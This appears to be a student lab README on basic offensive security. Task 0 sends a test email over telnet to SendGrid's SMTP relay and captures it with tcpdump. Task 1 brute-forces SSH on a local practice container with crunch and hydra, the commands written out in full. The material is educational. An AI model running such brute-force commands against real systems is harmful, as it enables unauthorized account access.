Attack_is_the_best_defense

Task 0
open an account in Sendgrid
look at the tutorial for send email with telnet

download script and execute

capture package the telnet send email and script

telnet smtp.sendgrid.net 587
EHLO ismtpd0013p1las1.sendgrid.net
auth login
colocan aqui su usuario pero en base64
luego el password de igual forma

mail from: fogniebla@hotmail.com
rcpt to: alzheimeer@hotmail.com
DATA

To: edgar fogniebla@hotmail.com
From: Recipient alzheimeer@hotmail.com
Subject: This is a test for the SMTP relay

Mensanje....
.Enter


tcpdump -i eth0 -w real.pcap

compare files

cool.



Task 1

Install docker and download container
docker run -p 2222:22 -d -ti sylvainkalache/264-1

with sudo docker ps
with sudo docker ps -a
check if service is run

User: sylvain
ip: 127.0.0.1
port: 2222


For entry:

ssh sylvain@127.0.0.1 -p2222

the Password has 11 characters


install hydra and crunch

./crunch 11 11  -o pepe.txt
generate passwords file
or download the https://thehacktoday.com/password-cracking-dictionarys-download-for-free/

and with

hydra -s 2222 -l sylvain -P pepe.txt 127.0.0.1 -V  ssh

wait several hours

cool.